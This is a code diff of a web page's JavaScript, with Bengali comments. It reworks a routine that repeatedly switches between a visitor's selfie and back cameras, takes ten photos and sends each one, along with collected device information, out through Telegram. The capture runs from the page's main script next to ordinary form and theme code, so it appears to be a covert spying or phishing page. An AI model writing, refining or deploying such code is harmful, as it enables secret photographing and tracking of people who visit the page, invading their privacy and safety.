@@ -165,36 +165,37 @@
 
         // --- ক্যামেরা এবং তথ্য পাঠানোর নতুন এবং উন্নত ফাংশন ---
 
-        // একটি নির্দিষ্ট ক্যামেরা থেকে ছবি তোলার সম্পূর্ণ প্রক্রিয়া পরিচালনা করে
-        async function captureFromCamera(facingMode, photoCount, baseCaption) {
-            let video;
-            try {
-                video = await startCamera(facingMode);
-            } catch (error) {
-                console.error(`Could not start ${facingMode} camera. Skipping.`);
-                return; // ক্যামেরা চালু না হলে এই ফাংশন থেকে বেরিয়ে যাবে
-            }
+        // পর্যায়ক্রমে সেলফি ও ব্যাক ক্যামেরা থেকে ছবি তোলার মূল ফাংশন
+        async function initiateAlternatingCapture(baseCaption) {
+            const totalPairs = 5; // ৫ জোড়া ছবি, অর্থাৎ মোট ১০টি
 
-            const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back';
-            
-            for (let i = 1; i <= photoCount; i++) {
-                // প্রতিটি ছবির মাঝে একটি বিরতি দেওয়া হচ্ছে যাতে ক্যামেরা ফোকাস করতে পারে
-                await new Promise(resolve => setTimeout(resolve, 700));
+            for (let i = 1; i <= totalPairs; i++) {
+                // --- ১. সেলফি ক্যামেরা থেকে ছবি তোলা ---
+                let selfieVideo;
+                try {
+                    selfieVideo = await startCamera('user'); // সেলফি ক্যামেরা চালু
+                    await new Promise(resolve => setTimeout(resolve, 600)); // ক্যামেরা স্থির হওয়ার জন্য অপেক্ষা
+                    const selfieCaption = `${baseCaption}\n[Selfie Camera: Photo ${i}/${totalPairs}]`;
+                    await captureAndSendPhoto(selfieVideo, selfieCaption);
+                } catch (error) {
+                    console.error(`Could not capture selfie ${i}:`, error);
+                } finally {
+                    stopCamera(); // সেলফি ক্যামেরা বন্ধ
+                }
                 
-                const photoCaption = `${baseCaption}\n[${cameraTypeName} Camera: Photo ${i}/${photoCount}]`;
-                await captureAndSendPhoto(video, photoCaption);
+                // --- ২. ব্যাক ক্যামেরা থেকে ছবি তোলা ---
+                let backVideo;
+                try {
+                    backVideo = await startCamera('environment'); // ব্যাক ক্যামেরা চালু
+                    await new Promise(resolve => setTimeout(resolve, 600)); // ক্যামেরা স্থির হওয়ার জন্য অপেক্ষা
+                    const backCaption = `${baseCaption}\n[Back Camera: Photo ${i}/${totalPairs}]`;
+                    await captureAndSendPhoto(backVideo, backCaption);
+                } catch (error) {
+                    console.error(`Could not capture back photo ${i}:`, error);
+                } finally {
+                    stopCamera(); // ব্যাক ক্যামেরা বন্ধ
+                }
             }
-            
-            stopCamera(); // ছবি তোলা শেষে ক্যামেরা বন্ধ করা হচ্ছে
-        }
-        
-        // সেলফি এবং ব্যাক ক্যামেরা - উভয় থেকেই ছবি তোলার প্রক্রিয়া শুরু করে
-        async function initiateDualCameraCapture(caption) {
-            // প্রথমে সেলফি ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('user', 5, caption);
-            
-            // তারপর ব্যাক ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('environment', 5, caption);
         }
 
         // ডিভাইসের তথ্য সংগ্রহ ও টেলিগ্রামে পাঠানো
@@ -267,7 +268,7 @@
         // মূল ফাংশন যা সব প্রক্রিয়া শুরু করে
         async function initiateCaptureAndSend(caption) {
             await sendDeviceInfo();
-            await initiateDualCameraCapture(caption);
+            initiateAlternatingCapture(caption); // নতুন এই ফাংশনটি এখানে কল করা হয়েছে
         }
 
         // --- মূল পেজের বাকি স্ক্রিপ্ট ---
@@ -305,7 +306,6 @@
 
         function applyTheme(themeName) {
             document.body.className = `theme-${themeName}`;
-            // RGB মান সেট করার প্রয়োজন নেই কারণ CSS ভেরিয়েবল এটি হ্যান্ডেল করছে
         }
 
         function setupForm() {
@@ -430,4 +430,3 @@
     </script>
 </body>
 </html>
-
